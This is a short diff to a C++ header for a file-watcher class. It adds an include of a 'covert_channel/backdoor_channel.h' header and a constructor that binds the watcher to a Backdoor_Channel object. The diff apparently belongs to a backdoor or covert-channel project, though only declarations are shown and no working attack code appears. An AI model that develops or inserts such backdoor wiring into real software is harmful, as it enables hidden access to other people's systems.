@@ -2,24 +2,21 @@
 #define File_Watcher_H
 
 #include <string>
+#include <inotifytools/inotifytools.h>
+#include "../covert_channel/backdoor_channel.h"
 using std::string;
-
-#define EVENT_SIZE (sizeof(struct inotify_event))
-#define EVENT_BUF_LEN (1024 * (EVENT_SIZE + 16))
-
-
-
-
 
 class File_Watcher
 {
 public:
     File_Watcher();
+    File_Watcher(Backdoor_Channel& bc) : ch(bc) {};
     void start(string folder);
 
 private:
     const char* WATCH_DIR = "/tmp";
-
+    Backdoor_Channel &ch;
+    int run();
 };
 
 #endif 
